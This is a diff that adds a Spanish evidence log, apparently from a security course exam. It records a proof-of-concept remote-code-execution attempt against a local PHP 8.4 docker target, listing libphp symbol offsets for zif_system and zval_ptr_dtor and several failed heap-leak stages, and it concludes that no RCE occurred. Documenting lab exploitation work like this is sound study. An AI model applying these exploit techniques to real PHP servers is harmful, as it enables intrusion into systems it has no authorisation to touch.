@@ -1,0 +1,35 @@
+=== EV-W2-05 · W2 contra target oficial docker ===
+Host: kali · Fecha UTC: 2026-10-27T20:57:16Z
+Comando:
+./informe/tools/w2-docker.sh
+----------------------------------------------------------------------
+== Target oficial ==
+PHP 8.4.26 (cli) (built: Oct 21 2026 00:31:19) (NTS)
+Copyright (c) The PHP Group
+display_errors => STDOUT => STDOUT
+memory_limit => 8M => 8M
+session.upload_progress.enabled => On => On
+== Offsets reales del libphp del contenedor ==
+0000000000465370 t zif_system
+000000000065eb60 T zval_ptr_dtor
+
+== PoC contra el target oficial ==
+[*] target http://127.0.0.1/session2.php (cmd='id>/tmp/p1')
+[*] offsets: zif=0x465370 dtor=0x65eb60 htdata=0x690d8
+[*] rotating worker over HTTP
+[*] stage 1: heap leak (attempt 1/3)
+[-] heap leak missed
+[*] rotating worker over HTTP
+[*] stage 1: heap leak (attempt 2/3)
+[-] heap leak missed
+[*] rotating worker over HTTP
+[*] stage 1: heap leak (attempt 3/3)
+[-] heap leak missed
+[*] rotating worker over HTTP
+HEAP_LEAK_FAILED
+
+== Impacto ==
+sin /tmp/p1: no hubo RCE
+----------------------------------------------------------------------
+[exit=0] · Evidencia: /home/kali/IS-EXAMEN-UNIDAD-1/informe/evidencias/png/EV-W2-05.png
+Cierre UTC: 2026-10-27T20:57:21Z
